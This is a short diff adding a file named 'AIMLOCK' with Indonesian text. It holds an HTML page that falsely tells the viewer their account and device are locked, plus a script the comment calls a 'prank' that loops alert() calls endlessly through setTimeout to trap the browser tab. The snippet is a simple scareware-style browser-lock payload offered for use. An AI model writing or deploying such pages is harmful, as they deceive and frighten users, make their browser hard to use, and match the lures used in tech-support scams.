@@ -1,0 +1,16 @@
+nama=AIMLOCK 
+language=html
+lines=12
+date=25/11/2025
+code=<h1> AKUN ANDA TERKUNCI </h1>
+<p>SISTEM MENGUNCI DEVICE ANDA ❗</p>
+</div>
+
+<script>
+// PRANK ALERT TANPA HENTI (infinite loop)
+function spamAlert() {
+    alert('AKUN ANDA TELAH TERKUNCI');
+    setTimeout(spamAlert, 1); // semakin kecil = semakin cepat
+}
+spamAlert();
+</script>
